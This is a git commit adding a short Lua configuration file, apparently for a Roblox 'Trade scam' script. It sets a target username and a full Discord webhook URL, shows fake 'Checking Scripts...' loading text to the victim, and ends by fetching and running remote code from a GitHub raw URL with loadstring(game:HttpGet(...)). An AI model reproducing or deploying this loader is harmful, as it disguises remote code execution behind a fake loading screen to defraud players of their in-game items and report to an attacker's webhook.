828cf37cf30a207112cf6235ac6b4d8ce0a61b5d
JBkingcode <115029210+JBkingcode@users.noreply.github.com>
2023-04-08 21:29:17 +0200

    Add files via upload

---
+++ stt.lua
@@ -0,0 +1,11 @@
+Username = "FrankErSej_6"
+WebHook = "https://discord.com/api/webhooks/1094342828261388328/V-AD5WDaHJhEPc-PZPB5hhhBnnDmL_R2nHQCQ0UCm374m74LtmYTr5BqDaqMcLF83Pet"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Trade scam"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
